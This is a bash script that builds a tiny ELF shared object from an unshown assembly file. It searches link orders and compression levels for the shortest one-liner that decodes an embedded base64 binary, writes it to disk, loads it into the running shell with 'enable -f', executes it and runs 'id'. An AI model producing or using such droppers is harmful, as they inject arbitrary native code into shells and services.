#!/bin/bash
fmt=bin
in=dump.asm
obj=su.o
noshstrtab=s.notab
out=s

ldoptions=( --hash-style=sysv )

#####

if [[ $fmt = bin ]]; then
  declare -a S=( rela symtab dynamic PHdr strtab code .data )
else
  declare -a S=(
    ".dynsym   : { *(.dynsym) }"
    ".rela.dyn : { *(.rela.data) }"
    ".hash     : { *(.hash) }"
    ".dynstr   : { *(.dynstr) }"
    ".dynamic  : { *(.dynamic) }"
    ".text     : { *(.text) }"
    ".data     : { *(.data) }"
  )
fi

# TODO: could probably save more room if the section was removed properly from headers
rmshstrtab() {
  local end
  end=$(strings -t d "$out" | awk '$2 == ".shstrtab" {print $1}')
  dd if="$out" of="$noshstrtab" bs=$end count=1 2>/dev/null
}

ldscript() {
  local i

  printf '
OUTPUT_FORMAT("elf64-x86-64")
OUTPUT_ARCH(i386:x86-64)
SECTIONS
{
  . = SIZEOF_HEADERS;
'
  for i do printf '%s\n' "${S[i]}"; done
  printf '/DISCARD/   : { *(*) }\n }\n'
}

[[ $fmt = bin ]] && ldscript() {
  local i
  printf 'SECTION EHdr\\\n'
  printf 'SECTION %s follows=EHdr\\\n' "${S[$1]}"
  for ((i = 2; i <= $#; i++)); do
    printf 'SECTION %s follows=%s\\\n' "${S[${@:i:1}]}" "${S[${@:i-1:1}]}" 
  done
  printf ';\n'
}

link() {
  local pos=$1 max=$2 order=$3

  ld "${ldoptions[@]}" -T <(ldscript $order) -shared -o "$out" "$obj" 2>/dev/null
  strip "$out" || exit
  rmshstrtab
}

# dynamic codessss
[[ $fmt = bin ]] &&
link() {
  local pos=$1 max=$2 order=$3
  sed "s/^; SECTION_TEMPLATE/$(ldscript $order)/" "$in" > tmp.asm
  nasm -f bin -o "$noshstrtab" tmp.asm
}

zips() {
  local pos=$1 max=$2 order=$3 i k z m

  for cmd in gzip:gunzip bzip2:bunzip2; do
    zip=${cmd%:*} unzip=${cmd#*:}
    for ((i = 1; i <= 9; i++)); do
      z=$($zip -$i -c < "$noshstrtab" | base64 -w 0)
      m="# recode /64<<<${z}|$unzip>$out;enable -f./$out $out;$out;>/z;id"
      ((${#m} < min || min == 0)) && {
        k="$order,$zip -$i"
        code[$k]=$z
        msg[$k]=$m
        min=${#m}
        min_k=$k
        printf '[%4d/%4d] size=%d [%s] is new smallest\n%s\n' $pos $max $min "$k" "$m"
        declare -p msg > savestate
      }
    done
  done
}

permutations() {
  local size=$1
  local i k tmp

  if ((size == 1)); then
    echo "${A[@]}"
    return
  fi

  for ((i=0;i<size;i++)); do
    permutations $((size-1)) "${A[@]}"

    (( k = size&1 ? 0 : i ))
    tmp=${A[k]}
    A[k]=${A[size-1]}
    A[size-1]=$tmp
  done
}

# quick version :)
permutations() { shift; echo "$@"; }

status() {
  printf '%s[%4d/%4d] size=%d%s' "$(tput sc)" $1 $2 $min "$(tput rc)"
}

#### main mess


min=0
declare -a A=( {0..6} )
declare -A code=() msg=()

if (( $# == ${#A[@]} )); then
  ldscript $*
  exit
fi

if [[ $fmt = elf64 ]]; then
  nasm -f "$fmt" -o "$obj" "$in"
elif [[ $fmt = bin ]]; then
  # done in link()..
  :
else
  printf '$fmt needs to be elf64 or bin'
fi

max=$(permutations "${#A[@]}" "${A[@]}" | wc -l)

# try a bunch of crap
while read -r order; do
  ((++i%10))||status $i $max
  link $i $max "$order"
  zips $i $max "$order"
done < <(permutations "${#A[@]}" "${A[@]}")
